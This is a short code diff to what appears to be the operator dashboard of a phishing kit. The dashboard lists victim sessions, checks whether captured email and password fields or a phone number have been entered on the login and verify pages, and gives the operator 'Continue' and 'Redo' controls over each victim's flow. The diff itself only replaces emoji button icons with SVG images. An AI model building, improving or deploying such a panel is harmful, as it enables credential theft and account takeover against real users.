@@ -230,14 +230,20 @@
       let html = '<div style="display:flex;gap:6px">';
       
       // Always show view details
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">📄</button>`;
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">
+        <img src="/images/description-svgrepo-com.svg" alt="Manage">
+      </button>`;
 
       // Show redo/continue based on page AND data entered - FIXED CONDITIONS
       if (s.page === 'index.html') {
         // On login page: show buttons if credentials entered (check both entered flag and email/password values)
         if (s.entered === true || (s.email && s.password)) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont', '${s.sid}')" title="Continue">
+          <img src="/images/arrow-right-square-svgrepo-com.svg" alt="Continue">
+        </button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo', '${s.sid}')" title="Redo">
+          <img src="/images/cross-square-svgrepo-com.svg" alt="Redo">
+        </button>`;
         }
       } else if (s.page === 'verify.html') {
         // On verify page: show buttons if phone entered
@@ -503,3 +509,4 @@
   </script>
 </body>
 </html>
+
